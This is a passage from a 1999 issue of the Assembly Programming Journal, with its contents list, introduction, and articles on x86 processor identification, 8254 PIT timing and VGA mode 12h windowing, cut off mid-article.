@@ -1,0 +1,4499 @@
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.                                                Oct/Nov  99
+:::\_____\::::::::::.                                               Issue     6
+::::::::::::::::::::::.........................................................
+
+            A S S E M B L Y   P R O G R A M M I N G   J O U R N A L
+                      http://asmjournal.freeservers.com
+                           asmjournal@mailcity.com
+
+
+
+
+T A B L E   O F   C O N T E N T S
+----------------------------------------------------------------------
+Introduction...................................................mammon_
+
+"Processor Identification"........................Chris.Dragan.&.Chili
+
+"Timing with the 8254 PIT"...............................Jan.Verhoeven
+
+"Programming the Universal Graphics Mode"................Jan.Verhoeven
+
+"Conway's Game of Life".................................Laura.Fairhead
+
+"'Ambulance Car' Disassembly"....................................Chili
+
+"'Ambulance Car' Disinfector"....................................Chili
+
+"Assembling for PIC's"...................................Jan.Verhoeven
+
+"Splitting Strings"............................................mammon_
+
+"String to Numeric Conversion"..........................Laura.Fairhead
+
+Column: Win32 Assembly Programming
+    "WndProc, The Dirty Way".................................X-Calibre
+    "Programming the DOS Stub"...............................X-Calibre
+
+Column: The Unix World
+    "Using ioctl()"............................................mammon_
+
+Column: Assembly Language Snippets
+    "BinToString"....................................Cecchinel Stephan
+
+Column: Issue Solution
+    "Absolute Value"....................................Laura.Fairhead
+	 
+----------------------------------------------------------------------
+       ++++++++++++++++++Issue  Challenge+++++++++++++++++
+		  Find the Absolute Value of a Register in  4 Bytes
+----------------------------------------------------------------------
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::..............................................INTRODUCTION
+                                                                     by mammon_
+
+
+Customarily I'll start with the bad news: this issue is about a week late, 
+primarily because I had forgotten about the two Win32 articles X-Calibre 
+passed on to me a month or two ago. The good news, however, is that there 
+may be a December issue; currently I have about 5 or so extra articles that 
+threatened to bump this issue over the 200K mark. Evenutally I may have a 
+chance to be late on a monthly basis...
+
+This issue has a bit of a 'back to the basics' feel about it. Packed inside 
+are articles dealing with some of the 'classics' of assembly: CPU identific-
+ation, graphics, and the ever-popular Game of Life. The disassembly of the 
+Ambulance Car virus also has an old-school feeling to it, hearkening back to 
+the old days of DOS and com files.
+
+Additional highlighs include X-Calibre's 'bending windows to your will' Win32
+articles, two excellent chip programming articles from Jan, utility routines 
+from Laura and myself, and of course my usual attempt to defend assembly as a
+viable programming language for the Unix environment.
+
+Enough commentary; time to get this mag on the road!
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                                                       Processor Identification
+                                                       by Chris Dragan & Chili
+
+
+Being able to identify the processor in which your program is running, can be a
+very useful feature,  if not to ensure that  your program will work  on a wider
+range of computers,  at least to provide minimum compatibility and guarantee it
+not to crash on some processors.
+
+The first part of this article  explains how to distinguish between older 80486
+and lower  processors by checking  for known behaviours,  while the second part
+(written by Chris)  takes it one step forward,  explaining how to use the CPUID
+instruction on newer processors, checking the ID register by means of a TFR and
+how to correctly identify a Cyrix processor.
+
+
+EFLAGS Register
+---------------
+On old pre-286 CPUs,  bits 12 through 15 of the FLAGS register are always  set,
+so we can  check for this  type of processor,  in opposition to newer ones,  by
+attempting to clear those bits:
+
+                pushf
+                pop     ax
+                and     ax, 0fffh       ; clear bits 12-15
+                push    ax
+                popf
+                pushf
+                pop     ax
+                and     ax, 0f000h
+                cmp     ax, 0f000h      ; check if bits 12-15 are set
+                je      _is_an_older_cpu
+                jne     _is_a_286_or_higher
+
+Once we know that we are at least on a 286 processor,  we can then check to see
+if we're on a 32-bit processor  (386 or higher)  or on an actual 286.  For this
+purpose we know that bits 12-15 of the FLAGS register are always clear on a 286
+processor in real mode:
+
+                pushf
+                pop     ax
+                or      ax, 0f000h      ; set bits 12-15
+                push    ax
+                popf
+                pushf
+                pop     ax
+                and     ax, 0f000h      ; check if bits 12-15 are clear
+                jz      _is_a_286
+                jnz     _is_a_386_or_higher
+
+If instead, the processor is running in  protected mode these bits are used for
+the IOPL (bits 12-13) and NT (bit 14) flags. Note that bits 12-14 hold the last
+value loaded  into them on 32-bit processors  in real mode.  Also remember that
+there is no virtual-8086 mode on 16-bit processors.
+
+In order to find out if the processor is in real or protected mode we must test
+if the  Protection Enable  flag  (bit 0 of CR0)  is set,  if so  then we're  in
+protected mode:
+
+                smsw    ax
+                and     ax, 0001h       ; check if bit 0 (PE) is clear
+                jz      _real_mode
+                jnz     _protected_mode
+
+To find out  if it is a 486 or a  newer processor we'll try  to set the AC flag
+(bit 18),  since it  is always  clear on a  386 processor  (also NexGen Nx586),
+unlike newer ones that allow it to be toggled:
+
+                pushfd
+                pop     eax
+                mov     ebx,eax
+                xor     eax,40000h      ; toggle bit 18
+                push    eax
+                popfd
+                pushfd
+                pop     eax
+                xor     eax,ebx         ; check if bit 18 changed
+                jz      _is_a_386
+                jnz     _is_a_486_or_higher
+
+And finally to  check if we're in an  old 486 or in a  new 486 and other  newer
+processors  (i.e. Pentium),  we'll try  to toggle  the ID flag  (bit 21)  which
+indicates the presence of a processor that supports the CPUID instruction. This
+part is explained below in a section about CPUID.
+
+
+PUSH SP Instruction
+-------------------
+Before the 286, processors implemented the "PUSH SP" instruction in a different
+way,  updating the stack  pointer before  the value  of SP  is pushed  onto the
+stack,  unlike newer processors  which push the value  of the SP register as it
+existed before  the instruction  was executed  (both in  real and  virtual-8086
+modes).
+
+  Older CPUs            286+
+  {                     {
+   SP = SP - 2           TEMP = SP
+   SS:SP = SP            SP = SP - 2
+  }                      SS:SP = TEMP
+                        }
+
+  (credit for the PUSH SP algorithm representation goes to Robert Collins)
+
+So all  one has to  do is see if  the values of  the SP register  are different
+before and after the PUSH SP:
+
+                push    sp
+                pop     ax
+                cmp     ax, sp          ; check if SP values differ
+                je      _is_a_286_or_higher
+                jne     _is_an_older_cpu
+
+Note - If you want  the same result  on all processors,  use the following code
+       instead of a PUSH SP instruction:
+
+                push    bp
+                mov     bp, sp
+                xchg    bp, [bp]
+
+
+Shift and Rotate Instructions
+-----------------------------
+Starting with the 186/88, all processors mask shift/rotate counts by modulo 32,
+restricting  the maximum count to 31  (in all  operating modes,  including  the
+virtual-8086 mode).  Earlier CPUs do not mask  the shift/rotation count,  using
+all 8-bits of CL.  So, if we try to perform a 32-bit shift, on newer processors
+we'll  end up  with the  same result  (since the  shift count  is masked to 0),
+whereas on an older processor the result will be zero:
+
+                mov     ax, 0ffffh
+                mov     cl, 32
+                shl     ax, cl          ; check if result is zero
+                jz      _is_an_older_cpu
+                jnz     _is_a_18x_or_higher
+
+
+MUL Instruction
+---------------
+NEC processors  differ from Intel's  with respect to  the handling of  the zero
+flag (ZF) during a MUL operation. While a NEC V20/V30 does not clear ZF after a
+non-zero multiplication result, but only according to it, an Intel 8086/88 will
+always clear it (note that this is only true for the specified processors):
+
+                xor     al, al          ; force ZF to set
+                mov     al, 40h
+                mul     al              ; check if ZF is clear
+                jz      _is_a_NEC_V20_V30
+                jnz     _is_an_Intel_808x
+
+In addition to the list of sites where you can find more information,  provided
+by Chris at the end of this article, you can also try this one:
+
+        http://grafi.ii.pw.edu.pl/gbm/x86/     (Grzegorz Mazur)
+
+And also the following packages/programs (available somewhere in the net):
+
+        The Undocumented PC                    (Frank van Gilluwe)
+        HelpPC                                 (David Jurgens)
+        80x86.CPU file                         (Christian Ludloff)
+
+
+ID Register
+-----------
+Beginning  with the 80386 processor,  Intel included  a so-called  ID register,
+which  contains  information  about  the  processor  model and  stepping.  This
+register is accessible in an unusual way - it is passed in DX after reset.
+
+To read the ID register one must proceed the following steps:
+
+ 1. By storing value 0Ah (resume with jump)  at address 0Fh (reset code) in the
+    CMOS data area,  inform BIOS not to  issue POST after reset,  but to return
+    the control to the program.
+ 2. Update after-reset-far-jump address at 0040h:0067h.
+ 3. Set  shutdown  status  word  (0040h:0072h)  to  0,   to  avoid  undesirable
+    side-effects.
+ 4. Cause a reset.
+
+Causing a reset  is typically done by  issuing a so-called  triple-fault-reset,
+i.e.  causing  an error  from which the  processor  cannot  recover and  enters
+a reset state.  TFR (triple...)  can be  done only  if we  have enough  control
+over  the processor,  i.e.  under plain  DOS  in  real mode  (no EMS)  or under
+Win'95 (this is risky).  The following code shows how to do it in DOS. The code
+is assumed to be in a COM program.
+
+;------------------------------------------------------------------------------
+
+section .data
+
+GDT             dd 0, 0                 ; Selector 0 is empty
+                dd 0000FFFFh, 00009A00h ; Selector 8 - code segment
+GDTR            dw 000Fh, 0, 0          ; Limit 0Fh - two selectors
+IDTR            dw 0, 0, 0              ; Empty IDT will cause TFR
+
+section .text
+
+        ; Ensure that we are in real mode, not in V86
+                smsw    ax
+                and     al, 1
+                jnz     near _skip_tfr_since_in_v86_mode
+
+        ; Update code descriptor as we are going to enter pmode
+                xor     eax, eax
+                mov     ax, cs
+                shl     eax, 4
+                or      [GDT+10], eax
+                add     eax, GDT
+                mov     [GDTR+2], eax
+
+        ; Update reset code in CMOS data area
+                cli                             ; Disable interrupts
+                mov     [SaveSP], sp            ; Save stack pointer
+                mov     al, 0Fh                 ; Address 0Fh in CMOS area
+                out     70h, al
+times 3         jmp     short $+2               ; Short delay
+                mov     al, 0Ah                 ; Value 0Ah - far jump
+                out     71h, al
+
+        ; Update resume address
+                push    word 0
+                pop     es
+                mov     [es:0467h], word _tfr   ; offset
+                mov     [es:0469h], cs          ; segment
+                mov     [es:0472h], word 0      ; Update shutdown status
+
+        ; Switch to pmode
+                lgdt    [GDTR]                  ; Load GDT
+                lidt    [IDTR]                  ; Load empty IDT
+                smsw    ax
+                or      al, 01h                 ; Set pmode bit
+                lmsw    ax
+                jmp     0008h:_reset            ; Reload CS
+_reset:         mov     ax, [cs:0FFFFh]         ; Reach beyond segment limit
+
+        ; After reset we are here with DX containing the ID register
+_tfr:           cli
+                mov     ax, cs
+                mov     ds, ax
+                mov     es, ax
+                mov     ss, ax
+                mov     sp, [SaveSP]
+                sti
+
+;------------------------------------------------------------------------------
+
+Of course there are  also other ways of reading the ID register.  They are well
+described in DDJ (www.x86.org).
+
+As said before,  the ID register contains information about processor model and
+stepping. The format of the register is as follows:
+
+        bits 15..12     - stepping
+        bits 11..8      - model
+        bits 7..0       - revision
+
+Some example ID register values:
+
+        0303    i386DX
+        2303    i386SX
+        3301    i376
+
+This format  of the ID register  was used in  Intel 386 processors  (all except
+RapidCAD), AMD 386 processors and most of IBM 486 processors.
+
+Another format  of the ID register  was introduced  with Intel 486  processors.
+This format is similar  to the format of  CPUID model information  (see below),
+and until the  Pentium was kept the same.  However newer processors do not keep
+any useful information in the ID register (it is usually 0). This also concerns
+Cyrix 486 processors.
+
+        bits 15..14     - unused, zero
+        bits 13..12     - typically indicate overdrive
+        bits 11..8      - model
+        bits 7..4       - stepping
+        bits 3..0       - revision
+
+And some example ID register values with this format for Intel processors:
+
+        0401    i486DX-25/33
+        0421    i486SX
+        0451    i486SX2
+
+
+Cyrix DIR
+---------
+All Cyrix processors have a Device-Identification-Registers,  which are used to
+identify  these processors.  To read DIRs,  one first has to determine  that he
+uses a Cyrix processor. This can be accomplished in two ways:
+
+ 1. On modern processors using CPUID instruction.
+ 2. On first Cyrix processors issuing 5/2 method.
+
+If  there  is  no  CPUID  instruction,   one  has  to  use  the  other  way  of
+determination.  If one  knows that he  is on a  486 processor,  he can  use the
+following code:
+
+                mov     ax, 0005h
+                mov     cl, 2
+                sahf
+                div     cl
+                lahf
+                cmp     ah, 2
+                je      _we_are_on_cyrix
+                jne     _this_is_not_cyrix
+
+Once we have  determined we are  on a Cyrix processor,  we can read its DIRs to
+get its model and stepping information. All Cyrix processors have their special
+registers accessible through ports 22h and 23h.  Port 22h keeps register number
+and port 23h register value.
+
+        ; This function reads a Cyrix control register
+        ; It expects a register address in AL and returns value also in AL
+ReadCCR:        out     22h, al         ; select register
+times 3         jmp     short $+2       ; delay
+                in      al, 23h         ; get register contents
+                ret
+
+DIRs have offsets  0FEh (DIR1) and 0FFh (DIR0).  DIR1 contains revision,  while
+DIR0 contains model/stepping. The following code reads them:
+
+                mov     al, 0FEh
+                call    ReadCCR
+                mov     [DIR1], al
+                mov     al, 0FFh
+                call    ReadCCR
+                mov     [DIR0], al
+
+Example DIR0 values:
+
+        1B      Cx486DX2
+        31      6x86(L) clock x2
+        55      6x86MX clock x4
+
+
+CPUID Instruction
+-----------------
+All newer  processors have  the CPUID instruction,  which helps  to identify on
+what  processor  we are.  Before using it,  we must  first determine  if it  is
+supported, by flipping the ID flag (bit 21 of EFLAGS).
+
+                pushfd
+                pop     eax
+                xor     eax, 00200000h  ; flip bit 21
+                push    eax
+                popfd
+                pushfd
+                pop     ecx
+                xor     eax, ecx        ; check if bit 21 was flipped
+                jnz     _cpuid_supported
+                jz      _no_cpuid
+
+The only problem may be that NexGen processors do not support the ID flag,  but
+they do support the CPUID instruction.  To determine that, we must hook Invalid
+Opcode  exception  (int6)  and  execute  the instruction.  If the  exception is
+triggered, CPUID is not supported.
+
+Also some  early  Cyrix  processors  (namely  5x86  and  6x86)  have the  CPUID
+instruction disabled.  To enable it, we must first enable extended CCRregisters
+and then enable the instruction, setting bit 7 in CCR4.
+
+        ; Enable extended CCRs
+                mov     al, 0C3h        ; C3 corresponds to CCR3
+                call    ReadCCR
+                and     ah, 0Fh         ; bits 7..4 of CCR3 <- 0001b
+                or      ah, 10h
+                call    WriteCCR
+
+        ; Enable CPUID
+                mov     al, 0E8h        ; E8 corresponds to CCR4
+                call    ReadCCR
+                or      ah, 80h         ; bit 7 enables CPUID
+                call    WriteCCR
+
+The following functions are used to read/write CCRs:
+
+ReadCCR:        out     22h, al         ; Select control register
+times 3         jmp     short $+2
+                xchg    al, ah
+                in      al, 23h         ; Read the register
+                xchg    al, ah
+                ret
+
+WriteCCR:       out     22h, al         ; Select control register
+times 3         jmp     short $+2
+                mov     al, ah
+                out     23h, al         ; Write the register
+                ret
+
+After enabling CPUID we must  test if it is supported by  flipping the ID flag,
+unless  of course  we  have determined  that  we are not  on a  5x86 or 6x86 by
+reading DIRs.
+
+Once we have determined that CPUID is supported,  we can use it to identify the
+processor.  The instruction expects EAX  to hold a function number  and returns
+information corresponding to this number in EAX, ECX,EDX and EBX.  The two most
+important levels are listed below.
+
+        level 0 (eax=0) returns:
+
+        eax             Maximum available level
+        ebx:edx:ecx     Vendor ID in ASCII characters
+                        Intel   - "GenuineIntel" (ebx='Genu', bl='G'(47h))
+                        AMD     - "AuthenticAMD"
+                        Cyrix   - "CyrixInstead"
+                        Rise    - "RiseRiseRise"
+                        Centaur - "CentaurHauls"
+                        NexGen  - "NexGenDriven"
+                        UMC     - "UMC UMC UMC "
+
+        level 1 (eax=1) returns:
+
+        eax             bits 13..12     0 - normal
+                                        1 - overdrive
+                                        2 - secondary in dual system
+                        bits 11..8      model
+                        bits 7..4       stepping
+                        bits 3..0       revision
+                        If Processor Serial Number is enabled, all 32
+                        bits are treated as the high bits (95..64) of
+                        the number.
+        edx             Processor features (e.g. bit 23 indicates MMX)
+
+There are also  other levels,  i.e. level 2 returns cache  and TLB descriptors,
+level 3 the rest of Processor Serial Number.
+
+Other processors (AMD, Cyrix) also support extended levels.  The first extended
+level is  80000000h and  it returns in  EAX the maximum  extended level.  These
+extended levels  return information  specific to  that processors,  e.g. 3DNow!
+support or processor name.
+
+This example code determines MMX support:
+
+        ; First check maximum available level
+                xor     eax, eax        ; eax = 0 (level 0)
+                cpuid
+                cmp     eax, 0
+                jng     _no_higher_levels
+
+        ; Now check MMX support
+                mov     eax, 1          ; level 1
+                cpuid
+                test    edx, 00800000h  ; bit 23 is set if MMX is supported
+                jnz     _mmx_supported
+                jz      _no_mmx
+
+As this is not  the place for listing all the  available information about what
+values  are returned  by CPUID,  ID register or DIRs,  you should get  the most
+recent information from the processor vendors:
+
+        www.intel.com
+        www.amd.com
+        www.cyrix.com
+
+Also you can find very valuable information about the identification topic on:
+
+        www.sandpile.org
+        www.x86.org
+        www.cs.cmu.edu/~ralf/files.html
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+																		 Timing with the 8254 PIT
+                                                       by Jan Verhoeven
+
+
+Some time ago I saw a note on the mailinglist from someone in need for a
+flexible timer function. For this, there are several concepts.
+
+First, there is the timertick which is updated every 55 ms. For long
+time delays, this is the best method. Just read the timervalue at
+0000:046C, add the desired delay (in 55 ms intervals) and wait until the
+timer reaches that value.
+
+A second approach is to use modern BIOS-ses which have a timingfunction
+in BIOS interrupt 15h, but this is "only" present on machines from 1990
+or later.
+
+A third approach is to reprogram the RTC chip. No big deal, and there's
+a very accurate timer in it (upto 8 kHz) which even has interrupt
+capabillities for automated functions and simple multitaskings.
+ 
+But by far the best way (and most universal and accurate) is to use the
+"spare" timer in your PC's 8254 chip.
+
+This chip can be put in many operating modes, but we want it to do the
+following:
+
+        - start counting at a certain value
+        - count down
+        - latched reading mode
+        - no influence on further PC operation
+
+The counting sequence for the PC is as follows:
+
+        - there are 2^16 BIOS-timervalue updates per hour
+        - there are 2^16 8254 clockpulses per timertick
+
+So, there are 2^32 clockpulses per hour. This boils down to one clock
+pulse being around 838 ns. Not bad.
+
+In order to make things very clear I use Modula-2 to show how the
+routines are coded. Modula is an extremely structured language, so I use
+it as a kind of Meta-Assembler or Pseudo-Assembler.
+For those not too familiar with Modula: a CARDINAL is not an old man in
+a dress, but a 16 bit unsigned integer.
+
+Here comes.....
+
+---------- OpenTimer ---------------------------- Start ----------
+
+PROCEDURE OpenTimer;        (*  open timer chip in mode 2   *)
+
+BEGIN
+    ASM
+        MOV  AL, 34H
+        OUT  43H, AL
+        XOR  AL, AL
+        OUT  40H, AL
+        OUT  40H, AL
+    END;
+END OpenTimer;
+
+---------- OpenTimer ----------------------------- End -----------
+
+The value 34h is constructed as follows:
+
+        bit     function
+       -----    ---------------------------
+       6 - 7    select counter (0 - 3)
+       4 - 5    Read/write mode
+       1 - 3    Select countermode
+         0      Binary or BCD
+
+For this case we selected:
+
+        - counter 00
+        - read/write two bytes from/to counterchip
+        - Mode 2
+        - binary values
+
+These few lines open the timer in "Mode 2" and prime the down counting
+register to 0000. I would love to elaborate on the code, but this is all
+which is needed....
+
+It is kind of handy if you restore the state of your machine after your
+application stops using the CPU. Therefore there is the following
+function to restore "normal" operation of this channel.
+
+---------- CloseTimer --------------------------- Start ----------
+
+PROCEDURE CloseTimer;           (*  close timer chip    *)
+
+BEGIN
+    ASM
+        MOV  AL, 36H
+        OUT  43H, AL
+        XOR  AL, AL
+        OUT  40H, AL
+        OUT  40H, AL
+    END;
+END CloseTimer;
+
+---------- CloseTimer ---------------------------- End -----------
+
+This function just restores the timer to it's default mode and clears
+the counting registers. The value "36h" means:
+
+        - counter 00
+        - read/write two bytes from/to counterchip
+        - Mode 3
+        - binary values
+
+---------- ReadTimer ---------------------------- Start ----------
+
+PROCEDURE ReadTimer () : CARDINAL;     (*  read timer   *)
+
+VAR     Time        : CARDINAL;
+
+BEGIN
+    ASM
+        MOV  AL, 6
+        OUT  43H, AL
+        IN   AL, 40H
+        MOV  AH, AL
+        IN   AL, 40H
+        XCHG AH, AL
+        MOV  [Time], AX
+    END;
+    RETURN Time;
+END ReadTimer;
+
+---------- ReadTimer ----------------------------- End -----------
+
+After we opened the timer, it might be a good idea to also use it. This
+is done in a two-step operation:
+
+ - current value of counting register is stored in On-Chip buffer
+ - the low byte is read in first
+ - the high byte is read in second
+ - low and high byte are put in right order
+
+Make sure you always read in TWO bytes, else you will run into framing
+errors. Also keep in mind that this is a DOWN-COUNTER!
+
+The value "6" which is sent to the 8254 first might be wrong, but in all
+my software it just works fine. It selects Channel 0 to be latched. The
+lower four bits of this word should be "don't care" bits, but I prefer
+"not to fix a running program".
+
+---------- MilliSeconds ------------------------- Start ----------
+
+PROCEDURE MilliSeconds (ms : CARDINAL);
+
+VAR     MaxCount        : CARDINAL;
+
+BEGIN
+    MaxCount := 65535 - ms * 1193;
+    OpenTimer;
+    WHILE ReadTimer () > MaxCount DO
+        (*      Nothing!     *)
+    END;
+    CloseTimer;
+END MilliSeconds;
+
+---------- MilliSeconds -------------------------- End -----------
+
+This function has some deliberate errors inside. I calculate MaxCount
+such that it is too big. Reason: in Modula I do not control math
+operations as well as in ASM (of course!) That's why I subtract the
+value from 65,535 instead of 65,536. In ASM I would have used a NOT
+operation, but for Modula this is good enough.
+
+Furthermore I use the number 1193 to go from counting pulses to
+milliseconds. It's a not too big number so it is good enough to use in
+integer arithmatics.
+
+This "MilliSeconds" routine is a dumb waiting-procedure. It calculates a
+stop-value for the counter, initialises the counter to mode 2 and value
+0000 and then waits until the timer reaches there. Next it closes the
+timer and it's all over.
+
+The next function, which was made for diagnostic purposes, shows that in
+an application you would have to correct for the
+
+---------- TestTimer ---------------------------- Start ----------
+
+PROCEDURE TestTimer;
+
+VAR     First, Last, Delta, k        : CARDINAL;
+
+BEGIN
+    OpenTimer;
+    First := ReadTimer ();
+    WriteCard (First, 6);       Write (Tab);
+    FOR k := 1 TO 10000 DO
+        (*      Nothing!     *)
+    END;
+    Last := ReadTimer ();
+    Delta := First - Last;
+    WriteCard (Delta, 6);       WriteLn;
+    CloseTimer;
+END TestTimer;
+
+---------- TestTimer ----------------------------- End -----------
+
+You could use this routine to calibrate a timingloop, but on modern PC
+architectures this could well lead to disasters. Modern CPU's are so
+damned fast, that your loopcounter will overflow.
+Therefore this calibration technique is only useful for modifying
+inherently slow routines, like those using I/O operations. For some
+reason, I/O operations still need around one microsecond each, so these
+will slow down the routine enough to make sure there will be no overflow
+in the loop-counters.
+
+A friend of mine just uses IN instructions from some silly address to
+get reasonably accurate timingloops, assuming that 1 IN operation is
+about 1 microsecond. Bit it could well lead to trouble on modern PCI
+hardware.
+
+All in all, for most delay-routines, the dumb waiting function is by far
+the best since it is the most reliable and accurate to less than a
+microsecond. But if you need this many digits, use compensated software,
+that takes into account the time to read the timers twice -- because you
+need to keep in mind that also this routine relies heavily on I/O
+instructions, so it is not infinitely fast!
+
+
+In a future article I will describe how to use the RTC chip for
+generating timing signals and how to use it via the Programmable
+Interrupt Controller in automatic mode. That article will be pure ASM
+again, so don't be worried about this detour into Modula.
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::...........................................FEATURE.ARTICLE
+                       Programming for the one and only universal graphics mode
+                                                               by Jan Verhoeven
+
+
+If you need to write a graphics routine that has a reasonable resolution and
+which is nearly always present, there is just one choice: mode 12h or the well
+known 640 x 480 x 16. This mode is the highest resolution mode which is always
+available in all VGA cards.
+800 x 600 is better but it either needs a VESA driver installed or the user
+must himself figure out how to switch the machine to that mode. Not an easy
+task for the majority of "experienced Windows users" (isn't this a paradox?).
+
+Mode 12h is treated as a worst case by many Superior Operating Systems. But
+for most purposes it is just fine. It's fast, reasonably easy to use and it is
+omni present.
+
+That's why I decided to port my textmode windows to this graphics mode.
+
+
+The application.
+----------------
+I built a simple AD converter that measures voltages and converts them into
+digits. The ADC fits on a COM port and is completely controlled from software.
+The idea was to have different reference voltages, sample rates, scaling
+factors, a bar graph display and a 4 digit LED-style read-out.
+And in the bottom window there is a "recorder" that plots pixels in real-time.
+
+If all parts have been explained I might post the full package (the sources,
+the schematics and such) so that everyone can build one for your own.
+
+
+How to switch to Mode 12h?
+--------------------------
+Going to mode 12h is easy. Just use the BIOS interrupt 10h as follows:
+
+        mov     ax, 012
+        int     010
+
+and you're in. Remember, I use A86 syntax, so all numbers starting with a
+nought are considered hexadecimal.
+
+
+Plotting in a graphics screen.
+------------------------------
+Now that we're in Mode 012, we should also try to fill that clear black
+rectangle. But first we should define a way of remembering WHERE to put our
+cute little dots.
+
+For all my plotting, I use the following structure:
+
+    -------------------------------- Window Information Block ------
+    Infoblk1 STRUC
+    Win_X    dw    ?        ; top-left window position, X and ...
+    Win_Y    dw    ?        ;     ... Y
+    Win_wid  dw    ?        ; window width and ...
+    Win_hgt  dw    ?        ;     ... height
+    CurrX    dw    ?        ; within window, current X-coordinate, ...
+    CurrY    dw    ?        ;     ... and Y
+    DeltaX   dw    ?
+    DeltaY   dw    ?
+    Indent   dw    ?        ; Indentation for characters in PIXELS!
+    Multiply dw    ?        ; screenwidth handler
+    Watte01  dw    ?        ;
+    BoxCol   db    ?        ;     border colour
+    TxtCol   db    ?        ;       text colour
+    BckCol   db    ?        ; background colour
+    MenuCol  db    ?        ;  menu text colour
+             ENDS
+    -------------------------------- Window Information Block ------
+
+It will be clear after looking into this list, that each InfoBlock describes a
+window, a rectangular portion of the screen, which is treated as a unity.
+
+Each window is defined by the topleft (x,y) coordinates and the window width
+and height. Knowing these four words, the window is defined and fixed on
+screen. If the window is to be moved, just adjust the topleft (x,y) position.
+
+Since it is handy to know where in this window we are plotting, I defined two
+more X and Y values: "CurrX" and "CurrY". When a request to (un)plot is made,
+it will start on these coordinates.
+
+For line drawing and such there are the "DeltaX" and "DeltaY" variables. The
+former is for horizontal lines, the latter for vertical lines.
+
+Now that we have our fancy window, where we can plot and draw lines, we also
+need some text to see what it's all supposed to be about. The text is plotted
+at the CurrX and CurrY postions. Each character is PLOTTED there, so tokens
+can be put at ANY location on screen, not just on byte boundaries.
+
+For nice and easy alignments, I defined the variable "Indent" which defines
+how many pixels from the left or right margin must remain blank.
+
+Since this software should be as easy to adapt to other resolutions as
+possible, there is a need for a "Multiply" variable. This is filled with the
+offset address of a dedicated screen multiplier routine.
+In Mode 012 there are 640 pixels on a line. That's 80 bytes. So in order to
+calculate the pixel address you need to use the following formula:
+
+        PixAddr = CurrY * 80 + CurrX / 8
+
+So we need a set of damned fast Mul_80 routines. If needed you can make some
+of them and at init-time find out the CPU and hardware and assign a suitable
+routine and fill it in in the Window definition structures.
+
+The "Watte01" field is just a filler. Reserved by me.
+
+Since the Mode 012 has 16 colours to spare we should also use them. Therefore
+I set up space for 4 colours: Box-, Text-, Background- and Menu-colours.
+Each printing routine will make sure the right colour is set.
+
+It will be clear that each window is very flexible to use. If the position is
+wrong, just change a few numbers. Also if the colours are not optimal.
+And by having several windows assigned to the same area on screen, you can
+easily build special effects:
+
+    fullscrn dw     0,  0,640,480, 0, 0, 0, 0, 4, mul_80, 0
+             db    12, 14,  3, 15               ; main screen window
+
+FullScrn just describes the complete screen. It is used for some very general
+printing an plotting tasks. It starts at topleft (0,0) and is 640 wide and 480
+high.
+
+    ParWin2  dw     5, 30,630,150, 8, 9, 0, 0, 4, mul_80, 0
+             db    10, 11,  3, 11               ; Parameter window
+
+This is a window which is a subwindow of the Full Screen for storing data and
+parameters.
+
+    PlotWin  dw     5,195,630,260, 0, 0, 0, 0, 4, mul_80, 0
+             db     9, 15,  3,  7               ; Virtual plotting window
+
+This is the Virtual Plotting Window. It has some text, plus the actual
+plotting window:
+
+    PlotWin2 dw     6,196,628,256, 0, 0, 0, 0, 4, mul_80, 0
+             db     9, 15,  3,  7               ; Actual plotting window
+
+This is the place where the pixels live. It starts one pixel down/right of the
+virtual window and also ends one pixel short of it.
+The reason for making this "dummy" window structure was that this way there is
+no need for an elaborate checking of extreme ends of the window while erasing
+pixels. On the extremes of the "Virtual Plotting Window" there are the pixels
+that make up a nice coloured box. It looks not nice when these lines are
+erased. And the easiest way to prevent this was by defining two separate
+windows: one for constructing the box and one for the actual work.
+
+The 4 digit LED-style read-out is also controlled by four different windows.
+Each digit has its own window definition:
+
+    ------------ Digit Space ------------------------------- Start ---
+
+    DigSpac1 dw    16, 90, 40, 50, 0, 0, 0, 0, 0, mul_80, 0
+             db     9, 11, 14,  3          ; Digital display, digit 1, MSD
+    DigSpac2 dw    56, 90, 40, 50, 0, 0, 0, 0, 0, mul_80, 0
+             db     9, 11, 14,  3          ; Digital display, digit 2
+    DigSpac3 dw    96, 90, 40, 50, 0, 0, 0, 0, 0, mul_80, 0
+             db     9, 11, 12,  3          ; Digital display. digit 3
+    DigSpac4 dw   136, 90, 40, 50, 0, 0, 0, 0, 0, mul_80, 0
+             db     9, 11, 12,  3          ; Digital display, digit 4, LSD
+
+    MSD = Most Significant Digit            LSD = Least Significant Digit
+
+    ------------ Digit Space -------------------------------- End ----
+
+This way it is convenient to allign the digits on screen. As with normal LED-
+style digits, the seven segments of them are drawn piece by piece. And erased
+if necessary.
+
+As you will know from voltmeters, the MSD is the least likely to change in
+time and the LSD is most likely to be different between any two samples. So in
+a way it is necessary to control erasing of just one digit without massive
+software overheads. Therefore I again chose to use a separate window for each
+digit. It makes erasing the digit easier and independent of the other three.
+
+Something else to observe is, that the two or three digits behind the decimal
+point have another colour from those before it. This way the user can easily
+see the approximate magnitude of the number without having to search for a
+decimal point. This is accomplished easily by having different BckCols in the
+LSD windows.
+
+This all costs a few bytes extra, but it saves a lot of coding.
+
+
+How to quickly load a segment register.
+---------------------------------------
+Segment registers cannot be loaded with immediate data. So you normally put a
+register on the stack and use that to transfer the constant to the actual
+segment register. This is not necessary. It can be done much easier like
+below:
+
+    VGA_base dw    0A000        ; for ease of loading segment registers
+
+And the corresponding code:
+
+    mov     es, [VGA_base]
+
+The detour via the stack or via AX takes more cycles and bytes.
+
+
+Defining what to print.
+-----------------------
+In a graphics screen there are an awful lot of places where to store our
+text. So we need a way to define where to put which tokens. For this I use the
+following construct:
+
+    -------------- Topic ----------------------------------- Start ---
+    Topic MACRO             ; start of printing message
+      dw   #1, #2
+      db   #3, #4
+      #EM
+
+    TopicEnd MACRO          ; topics stop here
+      dw   0F000
+      #EM
+
+             Topic 180, 9, 'Start : '
